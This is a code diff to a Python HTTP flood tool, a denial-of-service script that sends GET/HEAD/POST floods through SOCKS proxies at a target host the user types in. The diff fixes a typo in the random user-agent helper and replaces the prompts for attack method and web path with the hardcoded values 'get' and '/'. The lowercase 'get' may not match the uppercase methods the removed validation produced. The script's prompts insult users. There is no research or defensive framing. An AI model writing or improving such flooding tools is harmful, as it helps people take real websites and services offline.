@@ -79,7 +79,7 @@ clone_socks()
 
 
 def GenUA():
-    strNumber = random.ranint(0, 5000)
+    strNumber = random.randint(0, 5000)
     return str(strNumber)
 
 def flood(attack_type,host,port,path,x):
@@ -185,21 +185,7 @@ def main():
     global host
     global port
     global socks_version
-    attack_type = str(input("Choose (GET / HEAD / POST) : "))
-    if attack_type =="GET" or attack_type =="HEAD" or attack_type =="POST":
-        pass
-    elif attack_type =="Get" or attack_type =="get":
-        attack_type = "GET"
-        pass
-    elif attack_type =="Head" or attack_type =="head":
-        attack_type = "HEAD"
-        pass
-    elif attack_type =="Post" or attack_type =="post":
-        attack_type = "POST"
-        pass
-    else:
-        print("Wrong Input , Go Fuck Yourself Skid !")
-        sys.exit()
+    attack_type = "get"
     host = str(input("Target [Host/Ip] : "))
     if host =="":
         print("Loss Value -> host\nGo Fuck Yourself Skid !")
@@ -220,13 +206,7 @@ def main():
         port = 80
     else:
         port = int(port)
-    path = str(input("Web Path (/) : "))
-    if path =="":
-        print("Set Default Path -> /")
-        path = "/"
-    else:
-        path = path
-        pass
+    path = "/"
     proxyfile = str(input("Proxy Filename (socks5.txt) : "))
     if proxyfile =="":
         if socks_version =="5":
